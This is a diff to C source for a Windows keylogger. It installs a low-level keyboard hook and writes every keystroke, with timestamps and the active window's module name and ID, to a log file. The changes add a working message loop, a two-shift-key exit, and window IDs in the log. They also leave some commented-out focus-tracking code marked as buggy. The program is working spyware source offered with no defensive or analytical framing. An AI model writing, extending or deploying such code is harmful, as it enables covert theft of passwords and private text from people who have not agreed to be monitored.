@@ -1,5 +1,6 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
+#include <stdio.h>
 
 #define MAX_BUFSIZE 30
 #define MAX_MODULE_NAME 260
@@ -11,11 +12,20 @@ CHAR	prevModuleName[MAX_MODULE_NAME],
 		g_buf[MAX_BUFSIZE];
 
 
-BOOL getCharKey(const DWORD vkCode, const DWORD scanCode, LPWORD ch, DWORD winID)
+BOOL getCharKey(const DWORD vkCode, const DWORD scanCode, LPWORD ch, const DWORD winID)
 {
 	BYTE keyState[256];
 	GetKeyboardState(keyState);
+	
+//buggggggg
+	//AttachThreadInput(GetCurrentThreadId(), winID, TRUE);
+	//HWND wfc = GetFocus();
+	//DWORD tidfc = NULL;
+	//GetWindowThreadProcessId(wfc, &tidfc);
+	//(g_buf + strlen(g_buf) + 1, ":%d:", tidfc);
+//buggggggggg
 	return ToAsciiEx(vkCode, scanCode, keyState, ch, 0, GetKeyboardLayout(winID)) == 1;
+	//return ToUnicodeEx(vkCode, scanCode, keyState, (LPWSTR)&ch, 5, 0, GetKeyboardLayout(winID)) == 1;
 }
 
 BOOL getSysKey(const DWORD vkCode)
@@ -67,8 +77,9 @@ BOOL getSysKey(const DWORD vkCode)
 LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	GetKeyState(NULL);
-	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
+	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN|| wParam == WM_SYSKEYDOWN))
 	{
+
 		DWORD written;
 		KBDLLHOOKSTRUCT *ks = (KBDLLHOOKSTRUCT*) lParam;
 		SYSTEMTIME st;
@@ -81,6 +92,7 @@ LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		{
 			prevWinID = winID;
 			strcpy(prevModuleName, moduleName);
+			sprintf(moduleName + strlen(moduleName), " : %d", winID);
 			strcat(moduleName, "\r\n");
 			WriteFile(file, moduleName, strlen(moduleName), &written, NULL);
 		}
@@ -105,7 +117,8 @@ LRESULT CALLBACK LowLevelKeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
 		}
 	}
 
-
+	if (GetKeyState(VK_LSHIFT) & GetKeyState(VK_RSHIFT) & 0x0100)
+		PostQuitMessage(0);
 
 	return CallNextHookEx(hook, nCode, wParam, lParam);
 }
@@ -137,7 +150,6 @@ int main()
 	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED) 
 		return 1;
 
-
 	if (!CreateLogFile())
 	{
 		ReleaseMutex(mutex);
@@ -147,8 +159,12 @@ int main()
 	hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardHook, instance, 0);
 
 	MSG msg;
-	GetMessage(&msg, 0, 0, 0);
-	
+	while (GetMessage(&msg, 0, 0, 0))
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+	}
+
 	ReleaseMutex(mutex);
 	UnhookWindowsHookEx(hook);
 	CloseHandle(file);
